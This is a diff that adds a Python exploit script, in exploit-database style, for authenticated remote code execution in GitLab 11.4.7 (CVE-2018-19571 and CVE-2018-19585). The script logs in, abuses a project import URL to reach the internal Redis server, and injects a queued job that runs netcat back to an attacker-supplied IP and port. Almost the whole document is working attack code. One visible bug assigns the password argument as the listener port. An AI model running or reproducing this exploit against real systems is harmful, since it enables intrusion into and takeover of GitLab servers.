@@ -1,0 +1,101 @@
+# Exploit Title: GitLab 11.4.7 - RCE (Authenticated)
+# Date: 24th December 2020
+# Exploit Author: Sam Redmond
+# Software Link: https://gitlab.com/
+# Environment: GitLab 11.4.7, community edition
+# CVE: CVE-2018-19571 + CVE-2018-19585
+# Version: 11.4.7
+
+#!/usr/bin/python3
+
+import requests
+from bs4 import BeautifulSoup
+import argparse
+import random
+
+
+parser = argparse.ArgumentParser(description='GitLab 11.4.7 RCE')
+parser.add_argument('-u', help='GitLab Username/Email', required=True)
+parser.add_argument('-p', help='Gitlab Password', required=True)
+parser.add_argument('-g', help='Gitlab URL (without port)', required=True)
+parser.add_argument('-l', help='reverse shell ip', required=True)
+parser.add_argument('-P', help='reverse shell port', required=True)
+args = parser.parse_args()
+
+username = args.u
+password = args.p
+gitlab_url = args.g + ":5080"
+local_ip = args.l
+local_port = args.p
+
+session = requests.Session()
+
+# Get Authentication Token
+r = session.get(gitlab_url + "/users/sign_in")
+soup = BeautifulSoup(r.text, features="lxml")
+token = soup.findAll('meta')[16].get("content")
+print(f"[+] authenticity_token: {token}")
+
+login_form = {
+    "authenticity_token": token,
+    "user[login]": username,
+    "user[password]": password,
+    "user[remember_me]": "0"
+}
+r = session.post(f"{gitlab_url}/users/sign_in", data=login_form)
+
+if r.status_code != 200:
+    exit(f"Login Failed:{r.text}")
+
+# Create project
+import_url = "git%3A%2F%2F%5B0%3A0%3A0%3A0%3A0%3Affff%3A127.0.0.1%5D%3A6379%2Ftest%2F.git"
+project_name = f'project{random.randrange(1, 10000)}'
+project_url = f'{gitlab_url}/{username}'
+
+print(f"[+] Creating project with random name: {project_name}")
+
+form = """\nmulti
+    sadd resque:gitlab:queues system_hook_push
+    lpush resque:gitlab:queue:system_hook_push "{\\"class\\":\\"GitlabShellWorker\\",\\"args\\":[\\"class_eval\\",\\"open(\\'|""" + f'nc {local_ip} {local_port}' + """ \\').read\\"],\\"retry\\":3,\\"queue\\":\\"system_hook_push\\",\\"jid\\":\\"ad52abc5641173e217eb2e52\\",\\"created_at\\":1608799993.1234567,\\"enqueued_at\\":1608799993.1234567}"
+    exec
+    exec
+    exec\n"""
+
+r = session.get(f"{gitlab_url}/projects/new")
+soup = BeautifulSoup(r.text, features="lxml")
+
+namespace_id = soup.find(
+    'input', {'name': 'project[namespace_id]'}).get('value')
+
+project_token = soup.findAll('meta')[16].get("content")
+project_token = project_token.replace("==", "%3D%3D")
+project_token = project_token.replace("+", "%2B")
+
+payload = f"utf8=%E2%9C%93&authenticity_token={project_token}&project%5Bimport_url%5D={import_url}{form}&project%5Bci_cd_only%5D=false&project%5Bname%5D={project_name}&project%5Bnamespace_id%5D={namespace_id}&project%5Bpath%5D={project_name}&project%5Bdescription%5D=&project%5Bvisibility_level%5D=0"
+
+cookies = {
+    'sidebar_collapsed': 'false',
+    'event_filter': 'all',
+    'hide_auto_devops_implicitly_enabled_banner_1': 'false',
+    '_gitlab_session': session.cookies['_gitlab_session'],
+}
+
+headers = {
+    'User-Agent': 'Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US);',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+    'Accept-Language': 'en-US,en;q=0.5',
+    'Accept-Encoding': 'gzip, deflate',
+    'Referer': f'{gitlab_url}/projects',
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'Content-Length': '398',
+    'Connection': 'close',
+    'Upgrade-Insecure-Requests': '1',
+}
+
+print("[+] Running Exploit")
+r = session.post(
+    gitlab_url+'/projects', data=payload, cookies=cookies, headers=headers, verify=False)
+if "The change you requested was rejected." in r.text:
+    exit('Exploit failed, check input params')
+
+print('[+] Exploit completed successfully!')
